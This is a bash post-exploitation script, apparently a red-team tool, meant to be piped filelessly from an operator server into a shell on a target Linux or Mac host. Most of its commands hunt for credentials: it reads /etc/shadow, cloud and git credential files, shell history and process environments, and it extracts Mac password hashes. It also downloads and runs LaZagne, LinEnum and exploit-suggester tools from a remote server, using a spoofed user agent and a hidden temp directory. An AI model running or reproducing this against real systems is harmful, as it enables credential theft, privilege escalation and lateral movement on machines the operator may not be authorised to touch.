#!/bin/bash
# 
# Script documents a variety of ways to perform linux privilege escalation/
# lateral movement within Linux environment
# 
# Configure the variables in this script to ensure that script can be executed
# in the fileless manner on the target e.g. via curl, /bin/bash
#   curl -s -k "$SERVER_PROTO://$SERVER_HOST:$SERVER_PORT/invoke_linux_lateral_movt.sh" \
#     | /bin/bash
# 

# -----------------------------------------------------------------------------
# Variables - Operator to execute 
# -----------------------------------------------------------------------------

# The Server IP address to connect to download the filesss
SERVER_HOST="127.0.0.1"

# The port to connect to download the files
SERVER_PORT="8001"

# The protocol to use to pull the content from the remote server
SERVER_PROTO="http"

# User agent string to use to download the files
# Linux User-agent string
#USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0"
# Mac User-agent string
USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0"

# Download method to use to download the file or file as a string
FILE_DOWNLOAD_METHOD="curl"

# Shell to use to execute commands e.g. /bin/bash, /bin/zsh, /bin/sh, /bin/dash
SHELL="/bin/bash"

# Execute only a subset of command specified
EXEC_SUBSET="1"

# Run searches that take a long time e.g. find commands
RUN_LONG_RUNNING_CMDS=0

# Directory to work in
WORKING_DIR="/tmp/.sysinit"
# -----------------------------------------------------------------------------

function exec_cmd {
    # Function executes a command provided and prints the output displayed
    # 
    # Args:
    #     cmd_to_exec: Execute command. Required.
    #     shell: Shell type to use for execution. By default, set to the value 
    #         of $SHELL
    # 
    local cmd_to_exec=${1:-""}
    local shell=${2:-"$SHELL"}

    if [ ! -z "$cmd_to_exec" ]; then
        echo "[*] Executing command: $cmd_to_exec"

        # Execute the command using speccified shell
        $shell -c "$cmd_to_exec"

        # create some blank lines for clarity
        echo; echo
    fi
}

function download_file {
    # Function downloads file from the specified URL to a specific file
    # 
    # Args: 
    #     url: URL from which file is downloaded. Required.
    #     filename: Filename to write the URL to 
    #     file_download_method: File name to download the URL content to. \
    #         Default, calculated from url itself.
    # 
    local url="$1"
    local filename=${2:-""}
    local file_download_method=${3:-"$FILE_DOWNLOAD_METHOD"}

    if [ ! -z "$url" ]; then
        if [ -z "$filename" ]; then
            # Prepare the file to download to
            filename=$(basename "$url")
        fi

        echo "[*] Downloading from url: $url to file: $filename"
        if [ "$file_download_method" == "curl" ]; then
            # Download the file via curl
            curl -A "$USER_AGENT" -s -k "$url" -o "$filename"
        elif [ "$file_download_method" == "wget" ]; then
            # Download the file
            wget --no-check-certificate -U "$USER_AGENT" "$url" -O "$filename"
        fi
        
        # Add some blank lines for distinction
        echo; echo
    fi
}

function download_file_and_exec {
    # Function downloads file from the specified URL to a specific file and 
    # executes the file downloaded after making it executable
    # 
    # Args: 
    #     url: URL from which file is downloaded. Required.
    #     cmd_to_exec: Command to execute. Required.
    #     filename: File name to download the URL content to. Default, calculated
    #         from url itself.
    #     shell: Shell type to use. By default, set to the value of $SHELL
    #     file_download_method: Download method to use. Can be one of curl OR
    #         wget. By default, curl.
    # 
    local url="$1"
    local cmd_to_exec="$2"
    local filename=${3:-""}
    local shell=${4:-"$SHELL"}
    local file_download_method=${5:-"$FILE_DOWNLOAD_METHOD"}

    if [ ! -z "$url" ]; then
        if [ -z "$filename" ]; then
            # Prepare the file to download to
            filename=$(basename "$url")
        fi

        echo "[*] Downloading from url: $url to file: $filename"
        if [ "$file_download_method" == "curl" ]; then
            # Download the file via curl
            curl -A "$USER_AGENT" -s -k "$url" -o "$filename"
        elif [ "$file_download_method" == "wget" ]; then
            # Download the file
            wget --no-check-certificate -U "$USER_AGENT" "$url" -O "$filename"
        fi
        
        # Now, execute the command by putting the file into 
        local full_cmd="chmod +x $filename; $cmd_to_exec"
        exec_cmd "$full_cmd" "$shell" 

        # Add some blank lines for distinction
        echo; echo
    fi
}

function download_string {
    # Function downloads file as a string from the specified URL. Useful if 
    # we wish to pass a binary for file-less download.
    # 
    # Args:
    #     url: URL to download the file from. Required.
    #     string_download_method: Method to use to download the file as a string.
    #         Can be one of: curl
    # 
    # Output:
    #     Contents of downloaded file
    # 
    local url="$1"
    local string_download_method=${2:-"$FILE_DOWNLOAD_METHOD"}

    if [ ! -z "$url" ]; then
        if [ "$string_download_method" == "curl" ]; then

            # Download the file via curl
            curl -A "$USER_AGENT" -s -k "$url"
        fi
    fi
}

function get_os {
    # Function determines the operating system in use. Can be one of Mac or
    # Linux.
    # 
    # Returns:
    #     'mac', if Mac OS running
    #     'linux', if Linux running
    # 

    # Regex to identify if Mac
    local mac_regex="Darwin"

    # Regex to dentify
    local linux_regex="Linux|Solaris|RedHat"

    # Get OS info e.g. via uname
    local os=$(uname)

    # Check if Mac/Linux OS in use
    local is_mac=$(echo "$os" | grep -i "$mac_regex")
    local is_linux=$(echo "$os" | grep -i "$linux_regex")

    if [ ! -z "$is_mac" ]; then
        echo "mac"
    else
        echo "linux"
    fi
}

function switch_to_working_dir {
    # Function switches to the working directory, specified by $WORKING_DIR
    # 
    # Args:
    #     working_dir: Working directory to switch to
    # 
    local working_dir=${1:-"$WORKING_DIR"}
    
    # Create the working directory and switch to it
    [ ! -d "$working_dir" ] && mkdir "$working_dir"
    cd "$working_dir"

    echo "[+] cwd: $(pwd)"
}

# Determine the Operating system in use. Useful for executing certain scripts in 
os=$(get_os)

# Get the server addr
server_addr="$SERVER_PROTO://$SERVER_HOST:$SERVER_PORT"


function main() {

if [ "$EXEC_SUBSET" == "1" ]; then
    # Execute a subset of commands specified here - for testing.
    :
    
else
    # Switch working directory
    switch_to_working_dir

    # Execute all commands for privilege escalation/lateral movement checks
    echo "[!] Check for all users in home dirs if ~/.ssh/authroized_keys file \
is writable by the current user?. If ~/.ssh/authorized_keys file writable? If \
yes, then we can login with that - see https://www.debian.org/devel/passwordlessssh"
    exec_cmd "ls -l /home/*/.ssh/authorized_keys"
    exec_cmd "ls -l /root/.ssh/authorized_keys"

    echo "[!] Display the PATH environment variable where executables? Typical \
PATH values should be: /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
    exec_cmd "echo \$PATH"

    echo "[!] Determine which shells are available and can we symlink it? Used \
in exploits?"
    exec_cmd "which bash; which sh; which dash; which zsh; ls -l /bin/bash; \
ls -l /bin/sh; ls -l /bin/dash; ls -l /bin/zsh"

    echo "[!] Determine File Download Tools using 'which' command. For using XXD\
See https://www.linuxjournal.com/content/doing-reverse-hex-dump, where you can \
just copy the output via clipboard into the new shell. Base64 encoded output can \
also be simply copied across and decoded via base64."
    exec_cmd "which \"curl\"; which \"busybox\"; which \"wget\"; which \"curl\"; which \"nc\"; \
which \"nc.traditional\"; which \"netcat\"; which \"tftp\"; which \"ftp\"; \
which \"scp*\"; which \"xxd\"; which \"vim\"; which \"vi\"; which \"python\"; \
which \"base64\""

    echo "[!] Determine code compilers that can be ussed for compiling exploit \
code files via 'which' command"
    exec_cmd "which ruby; which perl; which php; which python; which gcc; \
which gcc-4.4; which gcc-4.6; which gcc-4.8; which cc"

    echo "[!] What mounts are actually available via /etc/fstab - any hidden/ \
unmounted points?"
    exec_cmd "cat /etc/fstab"

    echo "[!] Is private .reiserfs files present? # mount must be available in \
/etc/fstab with user_xattrsReiserFS Exploit for old Linux versions: \
https://www.exploit-db.com/exploits/12130/"
    exec_cmd "ls -l /.reiserfs_priv/xattrs"

    echo "[!] Are we running inside a sandbox e.g. a docker container - check via \
/.dockerenv and cgroup? Taken from: https://www.denialof.services/lambda/"
    exec_cmd "ls -l /.dockerenv; cat /proc/1/cgroup | grep -i docker"

    echo "[!] Are we running inside an AWS Lambda function? Taken from: \
https://www.denialof.services/lambda/"
    exec_cmd "ls -l /var/runtime/awslambda/bootstrap.py"

    echo "[!] Discover if there are .aws credentials on the device - which can \
be used for laterally moving creds. Once discovered, use the cloud_checks to \
review s3 buckets/access level with these keys. Also, check if you can actually \
create snapshots of the ec2 instance, and copy it to another account AND then \
review creds - privilege escalation via AWS EBS snapshot. Refs - Taken from: \
http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/"
    exec_cmd "ls -l ~/.aws/credentials; ls -l ~/.aws"

    echo "[!] Get the AWS Lambda input event values if running on Lambda \
function"
    download_string "http://localhost:9001/2018-06-01/runtime/invocation/next"

    echo "[!] Discover if any hidden files in Linux/Mac home folders - can 
contain creds?"
    exec_cmd "ls -la /home/*; ls -la /root/*; ls -la /Users/*/"

    echo "[!] Discover if any git credenitals file found in Mac/Linux - any
creds/tokens?"
    exec_cmd "ls -la /home/*/.git-credentials; ls -la /Users/*/.git-credentials; \
ls -la /root/*/.git-credentials"

    echo "[!] Look for command history - any creds OR interesting commands?"
    exec_cmd "history"

    echo "[!] List mountable block devices which can be mounted with the lsblk \
command. Once we find a mount system, run the command to get the type and then \
mount it: \
    sudo file -s <mount-eg-/dev/xvdf1>.
Or, Mount the block device: \
    mkdir /tmp/mount_point; sudo mount <device-type> /tmp/mount_point
# Taken from: /dev/xvdf1 flaws_cloud_level_3_public_unencrypted_snapshot_volume"
    exec_cmd "lsblk"

    echo "[!] What other mounts are available using 'mount' command? Taken from: \
https://www.denialof.services/lambda/"
    exec_cmd "mount"

    echo "[!] List contents of home directory via find, ls commands."
    exec_cmd "ls -la /home/; find /home; ls -la /root; find /root"

    echo "[!] List contents of the web directory (if any) via 'ls' and 'find'"
    exec_cmd "ls -la /var/www; find /var/www"

    echo "[!] Locate the Tomcat users file"
    exec_cmd "ls -la /var/lib/tomcat7/conf/tomcat-users.xml; \
ls -la /var/lib/tomcat*"

    echo "[!] What mounts are actually available via /proc/.../mounts command - \
any interesting mounts that we can read/write? Taken from: \
https://www.denialof.services/lambda/"
    exec_cmd "cat /proc/1/mounts; cat /proc/1/mountinfo"

    echo "[!] Look for any interesting mounts and their storage space?"
    exec_cmd "df"

    echo "[!] Look for any interesting files/folder configurations within /etc \
folder? Any interesting soft"
    exec_cmd "ls -l /etc/"
    
    echo "[!] What /dev (device) mounts actually available via ls command - \
any interesting mounts that we can read/write?. Taken from: \
https://www.denialof.services/lambda/"
    exec_cmd "ls -l /dev/"
    
    echo "[!] Determine the current user via 'id' command"
    exec_cmd "id"

    echo "[!] Determine the current user via 'whoami' command"
    exec_cmd "whoami"

    echo "[!] Get the IP address via 'ifconfig' command"
    exec_cmd "ifconfig"

    echo "[!] Get the IP address via 'ifconfig' command"
    exec_cmd "ip addr show"

    echo "[!] Get other systems within the same subnet via 'arp'"
    exec_cmd "arp -a; cat /proc/net/arp"
    
    echo "[!] Show all services running - any unencrypted services that we can \
takeover and steal creds such as POP/IMAP"
    exec_cmd "netstat -atunp"

    echo "[!] Get the User ID via the '\$UID' command"
    exec_cmd "cat /etc/passwd | grep -i \"\$UID:\""

    echo "[!] Determine the Linux version via 'uname' - any vulns?"
    exec_cmd "uname -a"

    echo "[!] Determine the versions in use via 'release' and other configs"
    exec_cmd "cat /etc/os-release; cat /etc/issue; uname -a; cat /etc/*release; \
lsb_release -a; ls /boot | grep \"vmlinuz\""

    echo "[!] Look for SQLITE Google cloud credentials stored locally for the \
service account on the PC"
    exec_cmd "ls -l ~/.config/gcloud/credentials.db; ls -l ~/.config/gcloud"

    echo "[!] Determine the Linux version via '/etc/issue' - any vulns?"
    exec_cmd "cat /etc/issue"

    echo "[!] Determine which user is member of which group via '/etc/group?"
    exec_cmd "cat /etc/group"

    echo "[!] Listing the scheduled crontab entries via cron, crontab"
    exec_cmd "cat /etc/crontab; crontab -l; ls -l /usr/lib/cron"

    echo "[!] Listing the scheduled jobs via 'at' - any scripts with creds? Are \
they writable and run as another user?"
    exec_cmd "at -l"

    echo "[!] Listing environment variables via export - any credentials?"
    exec_cmd "export"

    echo "[!] Listing environment variables via env - any credentials?"
    exec_cmd "env"

    echo "[!] Listing environment variables via env - any credentials? /proc, \
environ can show deleted creds too. Taken from: \
https://www.denialof.services/lambda/"
    exec_cmd "cat /proc/1/environ"

    echo "[!] List the nameservers for Linux - can look for what type of \
nameserver it is"
    exec_cmd "cat /etc/resolv.conf"

    echo "[!] Listing if /etc/passwd and /etc/shadow are writable? Then, we can \
"
    exec_cmd "ls -l /etc/passwd; ls -l /etc/shadow; ls -l /etc/group"

    echo "[!] Get list of installed software via dpkg, rpm, etc. - any known \
vulns?"
    exec_cmd "dpkg -l; "

    if [ "$os" == "mac" ]; then
        echo "[!] Get information about Mac OS X version via sw_vers"
        exec_cmd "sw_vers"
    fi

    echo "[!] Determine list of all users '/etc/passwd'. Any indications of \
software installed given username with vulns?"
    exec_cmd "cat /etc/passwd"

    echo "[!] Determine list of all users '/etc/passwd'. Any indications of \
software installed given username with vulns?"
    exec_cmd "cat /etc/passwd"

    echo "[!] Determine the list of all users '/etc/shadow'. Are we already \
root? Can we crack hashes? Any software installed determined from usernames \
with vulns?"
    exec_cmd "cat /etc/shadow"

    echo "[!] Extract the location of list that contain shadow hashes in Macbook \
as described here: https://apple.stackexchange.com/questions/186893/os-x-10-9-where-are-password-hashes-stored. \
To extract the hashes, run the command: 
    sudo defaults read /var/db/dslocal/nodes/Default/users/<username>.plist ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o -"
    exec_cmd "ls -l /var/db/dslocal/nodes/Default/users/*"
    
    if [ "$os" == "mac" ]; then
        echo "[!] Installing lazagne to check for any left-over creds on Mac"
        download_file_and_exec "$server_addr/lazagne/lazagne_mac_x64.app.zip" \
            "unzip lazagne_mac_x64.app.zip; \
             chmod 775 lazagne_mac_x64.app/Contents/MacOS/laZagne; \
             ./lazagne_mac_x64.app/Contents/MacOS/laZagne all"
    else
        echo "[!] Installing lazagne to check for any left-over creds on Linux"
        download_file_and_exec "$server_addr/lazagne/lazagne_linux_x64" \
            "./lazagne_linux_x64"
    fi

    if [ "$os" == "linux" ]; then
        echo "[!] Run lazagne to check for any left-over creds on Linux"
        download_file_and_exec "$server_addr/LinEnum/LinEnum.sh" \
            "./LinEnum.sh"
    fi

    if [ "$os" == "linux" ]; then
        echo "[!] Run linux-exploit-suggester to check for exploits"
        download_file_and_exec "$server_addr/linux-exploit-suggester/linux-exploit-suggester.sh" \
            "./linux-exploit-suggester.sh"
    fi

    if [ "$os" == "linux" ]; then
        echo "[!] Run linuxprivchecker to look for misconfigs on the Linux \
server - taken from: http://pentestmonkey.net/tools/audit/unix-privesc-check"
        download_file_and_exec "$server_addr/linuxprivchecker/linuxprivchecker.py" \
            "./linuxprivchecker.py"
    fi

    if [ "$os" == "linux" ]; then
        echo "[!] Run firmwalker to look for misconfigs on the Linux \
target"
        download_file_and_exec "$server_addr/firmwalker/firmwalker.zip" \
            "mkdir firmwalker; cd firmwalker; unzip ../firmwalker.zip; \
chmod 775 firmwalker.sh; ./firmwalker.sh; cd .."
    fi

    if [ "$os" == "linux" ]; then
        echo "[!] Run uptux to run scans for a number of different misconfigs \
on this system"
        download_file_and_exec "$server_addr/uptux/uptux.py" "./uptux.py"
    fi

    if [ "$RUN_LONG_RUNNING_CMDS" -eq "1" ]; then

        echo "[!] Determine code compilers that can be used for compiling exploit \
code files via 'find' command"
        exec_cmd "find / -name \"perl*\"; find / -name \"python*\"; \
find / -name \"gcc*\"; find / -name \"gcc-4.4*\"; find / -name \"cc*\"; \
find / -name \"ruby*\""

        echo "[!] Determine possible File Download Tools using 'find' command"
        exec_cmd "find / -name \"busybox*\"; find / -name \"wget*\"; \
find / -name \"nc*\" ; find / -name \"netcat*\" ; find / -name \"tftp*\" ; \
find / -name \"ftp*\"; find / -name \"scp*\"; find / -name \"xxd*\"; \
find / -name \"base64*\"; find / -name \"curl*\""

        echo "[!] Any interesting hidden files/folders in web-root directory \
e.g. /var/www? Or within PHP define statements maybe?"
        exec_cmd "grep -E -r -n -i \"password\" /var/www 2>/dev/null; \
grep -E -r -n -i \"secret\" /var/www 2>/dev/null; \
grep -E -r -n -i \"define\" /var/www 2>/dev/null"

        echo "[!] Any config files available which contain sensitive creds e.g. \
wordpress?"
        exec_cmd "find / -ipath \"*wp-config.php\"; \
find / -ipath \"*mysqli_connect.php\""

        echo "[!] List the contents of the /var directory, maybe there is a www \
directory, if not found"
        exec_cmd "ls -la /var"
    fi
fi

}

#main